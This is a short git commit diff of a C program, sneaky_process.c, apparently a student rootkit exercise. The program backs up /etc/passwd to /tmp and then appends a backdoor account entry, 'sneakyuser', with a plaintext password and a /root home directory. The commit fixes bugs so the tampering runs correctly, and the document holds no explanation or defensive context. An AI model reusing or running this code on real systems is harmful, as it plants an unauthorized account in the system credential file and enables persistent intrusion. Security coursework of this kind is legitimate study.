97051a5a30b6514ec8150cb4c11f119454496f74
root <root@ubuntu14-generic-template-01.oit.duke.edu>
2016-02-26 11:05:54 -0500

    02/26

--- sneaky_process.c
+++ sneaky_process.c
@@ -5,19 +5,20 @@
 int main() {
   int rc = fork();  
   printf("sneaky_process pid=%d\n", getpid());
-  if (rc == 0) {
-    char *myargs[3];
+  if (rc < 0) {
+    fprintf(stderr, "fork failed\n");
+    exit(1);
+  } else if (rc == 0) {
+    char * myargs[3];
     myargs[0] = strdup("cp");
     myargs[1] = strdup("/etc/passwd");
-    myargs[2] = strdup("/temp/passwd");
+    myargs[2] = strdup("/tmp/passwd");
     execvp(myargs[0], myargs);
-    
+  } else {    
     FILE * target = fopen("/etc/passwd", "a");
     char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-    fprintf(target, append); 
-    
+    fprintf(target, "%s", append); 
+    fclose(target);
   }
-
-
   return 0;
 }
